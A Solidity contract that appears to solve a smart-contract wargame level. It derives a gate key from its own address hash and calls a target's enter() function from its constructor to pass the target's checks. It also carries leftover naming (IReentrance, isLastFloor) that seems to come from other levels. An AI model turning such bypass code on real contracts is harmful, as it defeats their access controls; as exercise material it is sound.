// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
     function enter(bytes8 _gateKey) external;
}

contract ContractB {
    IReentrance public target;
    bool public firstCall = true;
    
    constructor(address _add) payable {
        target = IReentrance(_add);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF);
        target.enter(gateKey);

    }
    function isLastFloor(uint256) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }
        return true;
    }

}